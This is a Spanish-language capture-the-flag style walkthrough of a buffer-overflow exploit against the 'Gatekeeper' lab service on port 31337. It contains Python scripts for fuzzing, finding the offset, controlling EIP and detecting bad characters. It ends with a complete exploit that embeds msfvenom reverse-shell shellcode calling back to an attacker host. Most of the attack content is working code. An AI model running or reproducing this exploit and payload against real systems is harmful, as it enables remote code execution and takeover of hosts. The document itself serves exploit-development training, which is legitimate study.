# Buffer overFlow: Gatekeeper
- [Inicio](#Inicio)
- [Fuzzing](#Fuzzing)
- [Poc](#Poc)
- [Calculando el offset](#Calculando-el-offset)
- [Controlando el EIP](#Controlando-el-EIP)
- [Detectando badchars](#Detectando-badchars)
- [Salto al ESP](#Salto-al-ESP)
- [Generando shellcode](#Generando-shellcode)
- [Explotando el BOF](#Explotando-el-BOF)

### Inicio
Este binario se ha explotado sobre un `Windows 7` y corre por el puerto 31337. Al instalarlo da un problema relacionado con VCRUNTIME140.DLL, para solucionarlo solo tenemos que instalar las librerías de Visual C++ `vc_redist.x86.exe` que hay en este mismo repositorio o descargarlas desde aquí: https://www.microsoft.com/es-es/download/details.aspx?id=48145
- Cuando se le hace una petición por curl no devuelve nada, si se hace una petición por nc con `nc -nv 192.168.248.134 31337` podemos ver como se abre una conexión desde la que podemos intercambiar mesajes con un servidor remoto. La conexión se realiza de la siguiente manera, yo escribo algo y pulso enter para enviarlo, y el servidor remoto me devuelve un `Hola <LOQUEHEESCRITO>!!!`, así que esa parece ser la parte inyectable. La estructura para realizar las peticiones desde nuestros scripts es `s.send(<BUFFER> + '\r\n')`. Los caracteres que aparecen al final de la petición son `\r`: que es retorno de carro y `\n`: que significa nueva linea. Por lo tanto, el final de nuestra petición será `\r\n`, que es el equivalente a pulsar enter y enviar la petición.
### Fuzzing
- Creo un fuzzer para encontar la longitud de la cadena que necesito, para que el programa se corrompa y poder explotar el BOF: `python fuzzing.py`
```bash
#!/usr/bin/python

import sys, socket, signal, time

def handler(sig, frame):
        print("\n\n[!] Bye...\n")
        sys.exit(1)

# Ctrl+c
signal.signal(signal.SIGINT, handler)

ipAddress = '192.168.248.134'
port = 31337
buffer = 'A'*100

while True:
  try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(2)
    s.connect((ipAddress, port))
    print 'Fuzzing with '  + str(len(buffer)) + ' bytes'
    s.send(buffer + '\r\n')
    s.recv(1024)
    s.close()
    time.sleep(2)
    buffer = buffer + 'A' * 100
  except:
    print '[*] Crash occurred at buffer length: ' + str(len(buffer))
    sys.exit()
```
### Poc
- Lanzo el programa de nuevo y ejecuto el `immunity > File > Attach > Selecciono el programa > Attach > Pulso el Play` y envío el siguiente script, que es una poc para verificar que el programa crashea con el número de bytes que antes hemos indetificado: `python poc.py`
```bash
#!/usr/bin/python

import sys, socket, signal, time

def handler(sig, frame):
        print '\n\n[!] Bye...\n'
        sys.exit(1)

# Ctrl+c
signal.signal(signal.SIGINT, handler)

ipAddress = '192.168.248.134'
port = 31337

buffer = 'A'*200

while True:
  try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(2)
    s.connect((ipAddress, port))
    print 'POC with ' + str(len(buffer)) + ' bytes'
    s.send(buffer + '\r\n')
    s.recv(1024)
    s.close()
  except:
    print '[!] Crash occurred, exiting.'
    sys.exit()
```
### Calculando el offset
- Intento calcular el offset creando una cadena de caracteres única. Para crear la cadena utilizo el siguiente comando en mi equipo:
```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200
```
- Incorporo la cadena de caracteres creada al script Calculate_offset.py y lo lanzo con el immunity abierto para ver cuanto vale el EIP: `python Calculate_offset.py`
```bash
#!/usr/bin/python

import sys, socket, signal, time

def handler(sig, frame):
        print '\n\n[!] Bye...\n'
        sys.exit(1)

# Ctrl+c
signal.signal(signal.SIGINT, handler)

ipAddress = '192.168.248.134'
port = 31337

payload = ('Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag')

while True:
  try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(2)
    s.connect((ipAddress, port))
    print 'Send payload for calculate offset'
    s.send(payload + '\r\n')
    s.recv(1024)
    s.close()
  except:
    print '[!] Crash occurred, exiting.'
    sys.exit()
```
- En el caso de `gatekeeper el EIP vale (39654138)` y como está en `little endian`, tengo que darle la vuelta por pares, quedaría así `\x38\x41\x65\x35` en hexadecimal y para ver cuanto vale pongo: `echo "38416535" | xxd -ps -r`, por si quiero buscarlo manualmente en la cadena enviada.
- Pero puedo hacerlo automáticamente con pattern_offset:
```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 39654138
```
- Con el comando anterior ya puedo saber cuanto vale el `offset`, que es 146.

### Controlando el EIP
- Modifico el script para probar que puedo insertar en el `EIP` lo que yo quiera, por ejemplo "B", así que lo modifico para enviar, 146 "A", 4 "B" y 100 "C": `python controlling_eip.py`
```bash
#!/usr/bin/python

import sys, socket, signal, time

def handler(sig, frame):
        print '\n\n[!] Bye...\n'
        sys.exit(1)

# Ctrl+c
signal.signal(signal.SIGINT, handler)

ipAddress = '192.168.248.134'
port = 31337

offset = 'A'*146
eip = 'BBBB'
after_eip = 'C'*100

while True:
  try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(2)
    s.connect((ipAddress, port))
    print 'Controlling eip'
    s.send(offset + eip + after_eip + '\r\n')
    s.recv(1024)
    s.close()
  except:
    print '[!] Crash occurred, exiting.'
    sys.exit()
```
- Si todo ha ido bien veré que el EIP vale 42424242 y pulsado con el botón derecho sobre el ESP > Follow in Dump puedo ver en el recuadro de abajo a la izquierda lo que hay en la pila, que son las "C", es decir, muchos 43.
### Detectando badchars
- Ahora, como tengo que crear un `shellcode` pero los programas no admiten todos los caracteres, tengo que crear con `Mona un bytearray` que contenga todos los caracteres:
```bash
!mona config -set workingfolder C:\Users\tom\Desktop\%p # Primero me creo una carpeta de trabajo
!mona bytearray # Después me creo el bytearray, y con esto se me crea una carpeta en el escritorio que contine el bytearray
```
- Bytearray creado:
```bash
"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
```
- Modifico el script anterior para añadir los badcharts y ver como antes, en `Follow in Dump` si alguno de los `batcharts no aparecen en el ESP`. El script modificado: `python badchars.py` 
```bash
#!/usr/bin/python

import sys, socket, signal, time

def handler(sig, frame):
        print '\n\n[!] Bye...\n'
        sys.exit(1)

# Ctrl+c
signal.signal(signal.SIGINT, handler)

ipAddress = '192.168.248.134'
port = 31337

offset = 'A'*146
eip = 'BBBB'
after_eip = 'C'*100

badchars = ("\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

while True:
  try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(2)
    s.connect((ipAddress, port))
    print 'Send badchars'
    s.send(offset + eip + after_eip + badchars + '\r\n')
    s.recv(1024)
    s.close()
  except:
    print '[!] Crash occurred, exiting.'
    sys.exit()
```
- Para hacer esto, puedo buscar manualmente los batcharts que no aparecen o puedo hacerlo automáticamente. Primero crasheo el programa de nuevo y miro la primera dirección que aparece en el recuadro de abajo a la derecha `en el caso de gatekeeper 016419f8` y después lo comparo con mona: 
```bash
!mona compare -f  C:\Users\tom\Desktop\gatekeeper\bytearray.bin -a 016419f8
```
- En el caso de gatekeeper, son varios los badchars que el programa no acepta, en primer lugar me ha identificado como inválido `\x00`, así que vuelvo a lanzar el script anterior eliminado \x00 de la lista:
```bash
!mona bytearray -cpb "\x00" # Elimina el badchar encontrado y genera un nuevo bytearray para la nueva comparación sin ese badchars
```
- Vuelvo a lanzar el script con el nuevo array:
```bash
!mona compare -f  C:\Users\tom\Desktop\gatekeeper\bytearray.bin -a 016219f8  # Lo comparo y me detecta el badchar \x0a
!mona bytearray -cpb "\x00\x0a" # Elimina los badchars encontrados y genera un nuevo bytearray para la nueva comparación
```
El siguiente script es el resultado final después de eliminar `\x00` y `\x0a`:  `python badchars.py`
```bash
#!/usr/bin/python

import sys, socket, signal, time

def handler(sig, frame):
        print '\n\n[!] Bye...\n'
        sys.exit(1)

# Ctrl+c
signal.signal(signal.SIGINT, handler)

ipAddress = '192.168.248.134'
port = 31337

offset = 'A'*146
eip = 'BBBB'
after_eip = 'C'*100

badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

while True:
  try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(2)
    s.connect((ipAddress, port))
    print 'Send badchars'
    s.send(offset + eip + after_eip + badchars + '\r\n')
    s.recv(1024)
    s.close()
  except:
    print '[!] Crash occurred, exiting.'
    sys.exit()
```
- Lo vuelvo a comparar con el nuevo punto de ruptura `015119f8`:
```bash
!mona compare -f  C:\Users\tom\Desktop\gatekeeper\bytearray.bin -a 015119f8
```
Y ya parece que acepta todos los caracteres.
### Salto al ESP
- Ya controlo el EIP y tengo que buscar un `Opcode` para poder conducir el flujo del programa y saltar al ESP:
```bash
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb #  Primero    
jmp ESP # Después pongo esto. Y el programa me da la dirección FFE4, es decir: \xFF\xE4
```
- Para ver donde puedo encontrar esa dirección pongo en el immunity: `!mona modules` y busco una dirección que esté todo en False, `para este ejemplo es gatekeeper.exe` pongo en el immunity: `!mona find -s "\xFF\xE4" -m gatekeeper.exe` y me ofrece opciones y me quedo con uno que ponga `PAGE_EXECUTE_READ`, y cojo la dirección que aparece a la izquierda: `0x080414C3`. También tengo la opción de poner `!mona jmp -r esp` y llegaré al mismo resultado.

Después, con esa dirección pulso en `"c"` en el menú de arriba y después en la flechita negra con la barra `"=>|"` en el menú, pongo la dirección y me confirma que `0x080414C3` corresponde a un `JMP ESP`
- Ahora ya sé que esta dirección 0x080414C3 me vale, y que `en little endian sería \xC3\x14\x04\x08`, así que modifico el anterior script para `añadir la dirección EIP`, para `añadir los nops: \x90` (dan tiempo para que el shellcode se decodifique) y para `añadir el shellcode que entará en el ESP` y que se ejecutará justo después del `EIP`.
### Generando shellcode
- Genero el shellcode para entablarme una reverse shell:
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.248.131 LPORT=443 --platform windows -a x86 -b "\x00\x0a" -f c EXITFUNC=thread
```
### Explotando el BOF
- El script final con todo añadido es: `python exploit_BOF.py`, así que me pongo en escucha y lanzo el script.
```bash
#!/usr/bin/python

import sys, socket, signal, time

def handler(sig, frame):
        print '\n\n[!] Bye...\n'
        sys.exit(1)

# Ctrl+c
signal.signal(signal.SIGINT, handler)

ipAddress = '192.168.248.134'
port = 31337

offset = 'A'*146
eip = '\xC3\x14\x04\x08' # 0x080414C3
nops = '\x90'*32

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.248.131 LPORT=443 --platform windows -a x86 -b "\x00\x0a" -f c EXITFUNC=thread

shellcode = ("\xba\x44\xf0\xb8\x27\xda\xdc\xd9\x74\x24\xf4\x5d\x31\xc9\xb1"
"\x52\x31\x55\x12\x03\x55\x12\x83\xa9\x0c\x5a\xd2\xcd\x05\x19"
"\x1d\x2d\xd6\x7e\x97\xc8\xe7\xbe\xc3\x99\x58\x0f\x87\xcf\x54"
"\xe4\xc5\xfb\xef\x88\xc1\x0c\x47\x26\x34\x23\x58\x1b\x04\x22"
"\xda\x66\x59\x84\xe3\xa8\xac\xc5\x24\xd4\x5d\x97\xfd\x92\xf0"
"\x07\x89\xef\xc8\xac\xc1\xfe\x48\x51\x91\x01\x78\xc4\xa9\x5b"
"\x5a\xe7\x7e\xd0\xd3\xff\x63\xdd\xaa\x74\x57\xa9\x2c\x5c\xa9"
"\x52\x82\xa1\x05\xa1\xda\xe6\xa2\x5a\xa9\x1e\xd1\xe7\xaa\xe5"
"\xab\x33\x3e\xfd\x0c\xb7\x98\xd9\xad\x14\x7e\xaa\xa2\xd1\xf4"
"\xf4\xa6\xe4\xd9\x8f\xd3\x6d\xdc\x5f\x52\x35\xfb\x7b\x3e\xed"
"\x62\xda\x9a\x40\x9a\x3c\x45\x3c\x3e\x37\x68\x29\x33\x1a\xe5"
"\x9e\x7e\xa4\xf5\x88\x09\xd7\xc7\x17\xa2\x7f\x64\xdf\x6c\x78"
"\x8b\xca\xc9\x16\x72\xf5\x29\x3f\xb1\xa1\x79\x57\x10\xca\x11"
"\xa7\x9d\x1f\xb5\xf7\x31\xf0\x76\xa7\xf1\xa0\x1e\xad\xfd\x9f"
"\x3f\xce\xd7\xb7\xaa\x35\xb0\x77\x82\xcd\xc3\x10\xd1\x2d\xc5"
"\x5b\x5c\xcb\xaf\x8b\x09\x44\x58\x35\x10\x1e\xf9\xba\x8e\x5b"
"\x39\x30\x3d\x9c\xf4\xb1\x48\x8e\x61\x32\x07\xec\x24\x4d\xbd"
"\x98\xab\xdc\x5a\x58\xa5\xfc\xf4\x0f\xe2\x33\x0d\xc5\x1e\x6d"
"\xa7\xfb\xe2\xeb\x80\xbf\x38\xc8\x0f\x3e\xcc\x74\x34\x50\x08"
"\x74\x70\x04\xc4\x23\x2e\xf2\xa2\x9d\x80\xac\x7c\x71\x4b\x38"
"\xf8\xb9\x4c\x3e\x05\x94\x3a\xde\xb4\x41\x7b\xe1\x79\x06\x8b"
"\x9a\x67\xb6\x74\x71\x2c\xd6\x96\x53\x59\x7f\x0f\x36\xe0\xe2"
"\xb0\xed\x27\x1b\x33\x07\xd8\xd8\x2b\x62\xdd\xa5\xeb\x9f\xaf"
"\xb6\x99\x9f\x1c\xb6\x8b")

while True:
  try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(2)
    s.connect((ipAddress, port))
    print 'Send BOF exploit'
    s.send(offset + eip + nops + shellcode + '\r\n')
    s.recv(1024)
    s.close()
  except:
    print '[!] Crash occurred, exiting.'
    sys.exit()
```
- Una vez lanzado tendría que obtener una shell en la máquina objetivo.
